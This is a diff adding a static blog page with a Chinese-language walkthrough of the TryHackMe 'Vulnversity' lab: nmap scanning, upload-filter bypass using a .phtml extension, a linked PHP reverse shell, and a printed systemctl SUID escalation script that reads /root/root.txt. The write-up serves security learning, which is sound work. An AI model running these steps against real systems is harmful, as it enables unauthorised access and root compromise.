@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+
+
+
+
+
+
+
+    
+    
+          
+
+    
+    
+    
+    
+    <title>
+        
+            thm-vulnversity | Hexo
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/images/avatar.webp">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                Archives
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/about/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                About
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="https://garybear.cn/" link>
+            <v-list-item-icon><v-icon>rss_feed</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                我的博客
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="https://garybear.cn/hexo-theme-insulin/doc/#/" link>
+            <v-list-item-icon><v-icon>insert_drive_file</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                说明文档
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2024/02/15/thm-vulnversity/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnversity%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">vulnversity靶场笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%A6%E5%AF%9F%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">侦察：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.</span> <span class="toc-text">扫描网站目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:kb1000fx@gmail.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/kb1000fx" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://steamcommunity.com/profiles/76561198346798163" target="_blank">
+                    <v-icon>fab fa-steam</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://weibo.com/kb1000fx" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2015 - 2024 
+                John Doe
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Hexo</a>
+      </div>
+      <div id="site-description"></div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/about/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="https://garybear.cn/">
+              <v-icon>rss_feed</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="https://garybear.cn/hexo-theme-insulin/doc/#/">
+              <v-icon>insert_drive_file</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2024/02/15/thm-vulnversity/">thm-vulnversity</a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2024-02-15
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2024-02-15
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;Uncategorized
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <h1 id="vulnversity靶场笔记"><a href="#vulnversity靶场笔记" class="headerlink" title="vulnversity靶场笔记"></a>vulnversity靶场笔记</h1><h2 id="侦察："><a href="#侦察：" class="headerlink" title="侦察："></a>侦察：</h2><p>​	使用NMAP进行侦察。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sC -sV -T4 -v -oN 文件名 ip</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-p-所有端口</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sC使用脚本探测</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sV对发现的端口服务进行版本检测</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-T4使用快速扫描</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-v详细输出</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-oN将输出写入文件</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-pN禁用主机发现并扫描存活端口</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-A启动操作系统识别</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sS TCP/SYN扫描</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sS UDP扫描</span></span><br><span class="line">nmap -sV -v ip</span><br></pre></td></tr></table></figure>
+
+<p>​	可以看见开放了6个端口，系统是Ubuntu，使用了Squid代理，版本为3.5.12，web服务端口为3333，apache2.4.18；</p>
+<p>还有ftp和ssh服务。</p>
+<h2 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h2><p>​	这里我用了dirsearch</p>
+<p>​	能看见一个324b的网页&#x2F;internal，访问之后是一个文件上传界面，上传test.php后显示后缀不允许，可以爆破一下哪个后缀可以：</p>
+<p><img src="https://github.com/c0ld1nk/c0ld1nk.github.io/blob/main/images/blog_image/v1.png" alt="image-20231118214415886"></p>
+<p>​	得到结果phtml，之后就是反弹shell，脚本使用：<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+<p>​	上传成功后打开&#x2F;internal&#x2F;uploads，成功链接。</p>
+<p>​	cat &#x2F;ect&#x2F;passwd找到网站管理者用户：</p>
+<p><img src="https://github.com/c0ld1nk/c0ld1nk.github.io/blob/main/images/blog_image/v2.png" alt="image-20231118215419670"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​	接下来使用SUID提权：</p>
+<p><img src="https://github.com/c0ld1nk/c0ld1nk.github.io/blob/main/images/blog_image/v3.png"></p>
+<p>​	尝试sysyemctl执行root命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp).service</span><br><span class="line">echo &#x27;[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot; # &quot;&quot;内放指令</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target&#x27; &gt; $TF</span><br><span class="line">./systemctl link $TF</span><br><span class="line">./systemctl enable --now $TF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/c0ld1nk/c0ld1nk.github.io/blob/main/images/blog_image/v4.png" alt="image-20231118221828046"></p>
+<p><img src="https://github.com/c0ld1nk/c0ld1nk.github.io/blob/main/images/blog_image/v5.png" alt="image-20231118221859630"></p>
+<p>​	cat output即可得到root.txt</p>
+
+    </div>
+    <!--文末结束语-->
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;"> --- 本文结束 <i class="fas fa-heart"></i> The End --- </div>
+    
+    <!--页脚广告-->
+    
+    <v-divider></v-divider>
+    
+    <div class="post-nav">             
+              
+          
+            <div class="post-nav-button float-right">
+                <a class="font-weight-bold text-right" href="/2023/05/17/hello-world/">      
+                    Hello World
+                </a>
+                <v-icon>chevron_right</v-icon>
+            </div>
+        
+    </div>
+</v-card>
+
+
+
+        
+                            <div id="mobile-footer" class="d-block d-md-none">
+                                <v-divider></v-divider>
+                                <div id="mobile-footer-content">
+                                    <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a> &nbsp; Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+                                    <span> &copy; 2015 - 2024 John Doe</span>
+                                </div>
+                            </div>                   
+                        </v-col>                                            
+                    </v-row>
+                </v-container>
+            </v-content>
+        </v-app>
+    </div>
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script>
+<script src="https://cdn.jsdelivr.net/npm/vuetify@2.2.30"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-base64@3.5.2/base64.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.4.8/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({
+        startOnLoad: true,
+        theme: "default"
+    });</script>
+
+
+
+
+
+</body>
+</html>
